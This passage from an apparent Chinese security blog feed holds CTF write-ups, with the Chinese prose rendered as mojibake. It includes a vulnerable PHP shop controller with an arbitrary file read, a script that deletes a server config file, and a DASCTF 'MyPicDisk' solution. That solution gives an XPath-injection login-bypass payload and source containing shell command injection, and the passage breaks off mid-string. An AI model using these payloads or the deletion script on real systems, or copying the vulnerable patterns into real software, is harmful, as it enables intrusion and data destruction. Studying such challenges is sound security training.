class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>(<span class="variable">$time</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>(<span class="variable">$catid</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$pic</span>, <span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>patch.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;/var/www/html/config/config.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error deleting <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>åº”æ€¥å“åº”è€ƒå¯Ÿæ›´å¤šçš„æ˜¯ä¸€äº›æœ¨é©¬å’Œå‹’ç´¢ç—…æ¯’çš„çŸ¥è¯†ï¼Œæ¨¡å¼ä¸ctfç­”é¢˜æ¨¡å¼å·®ä¸å¤šï¼Œåªä¸è¿‡æ¯é“é¢˜ç»™åˆ†æ˜¯å›ºå®šçš„ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¬¬ä¸€æ¬¡æ‰“ dawd æ¨¡å¼ï¼Œæ„Ÿè§‰ dawd æ˜¯ awd çš„ç®€åŒ–ç‰ˆï¼Œæ²¡æœ‰ä¸æ­»é©¬è¿™ç§ä¸€æ¬¡æ‰“ä¸­æ¯æ¬¡éƒ½èƒ½æ‹¿åˆ†çš„éªšæ“ä½œï¼Œæ›´åŠ è€ƒéªŒå¤§å®¶å†™è„šæœ¬çš„é€Ÿåº¦å’Œç†Ÿç»ƒåº¦ã€‚</p><p>æ¯”èµ›æœ‰ç‚¹æ°´ï¼Œä¸»è¦é dawdæ”»é˜²æ‹‰åˆ†ï¼Œå› ä¸ºæˆ‘ä»¬é˜Ÿç¬¬ä¸‰è½®å°±å¼€å§‹æ‹¿åˆ†ï¼Œç­‰åˆ«çš„é˜Ÿä¼å¼€å§‹æ‹¿åˆ†çš„æ—¶å€™å°±å·²ç»ç”©å¼€å¥½å¤šåˆ†æ•°äº†ã€‚</p><p>åº”æ€¥å“åº”æœ€ååªå·®3é“é¢˜æ²¡ç­”ä¸Šæ¥ï¼Œæˆ‘æ²¡åšå‡ é“é¢˜ï¼Œä¸»è¦é é˜Ÿå‹cï¼Œé˜Ÿå‹tqlã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h2&gt;&lt;p&gt;æ­¤æ¬¡æ¯”èµ›è®¾DAWDæ”»é˜²èµ›å’Œåº”æ€¥å“åº”å®æˆ˜åœºæ™¯èµ›ä¸¤ä¸ªèµ›é¢˜ç±»å‹ï¼Œä¸¤ç§èµ›é¢˜åŒæ—¶å¼€èµ›ï¼Œå…¶ä¸­ï¼š&lt;/p&gt;
&lt;p&gt;â‘  DAWDæ”»é˜²èµ›ä¼šæä¾›4ä¸ªæ”»é˜²é¢˜ç›®ç¯å¢ƒï¼Œ</summary>
      
    
    
    
    <category term="awd" scheme="https://blog.lazyforever.top/categories/awd/"/>
    
    
    <category term="rce" scheme="https://blog.lazyforever.top/tags/rce/"/>
    
    <category term="php" scheme="https://blog.lazyforever.top/tags/php/"/>
    
    <category term="awd" scheme="https://blog.lazyforever.top/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›] MyPicDisk</title>
    <link href="https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/"/>
    <id>https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/</id>
    <published>2023-07-27T14:30:16.000Z</published>
    <updated>2023-10-06T06:16:59.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>å¼€å¯å®¹å™¨ï¼Œå‘ç°ä»¥ä¸‹è¡¨å•ï¼Œè¡¨å•ä¿¡æ¯é€šè¿‡postæ–¹æ³•ä¼ é€</p><img src="/2023/07/27/2023dasctf_MyPicDisk/1.png" class=""><p>é€šè¿‡xpathä¸‡èƒ½æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=&#x27;]|//*|//*[&#x27;&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>æ³¨å…¥æˆåŠŸï¼Œburpè§‚å¯Ÿè¿”å›åŒ…å‘ç°æ³¨é‡Šä¿¡æ¯è·å¾—æç¤ºä¸‹è½½æºç &#x2F;y0u_cant_find_1t.zip</p><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span> . <span class="variable language_">$this</span>-&gt;filename . <span class="string">&quot;  Last Modified Time: &quot;</span> . <span class="variable language_">$this</span>-&gt;lasttime . <span class="string">&quot;  Filesize: &quot;</span> . <span class="variable language_">$this</span>-&gt;size . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span> . <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">    <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">      <span class="variable">$x_query</span> = <span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ 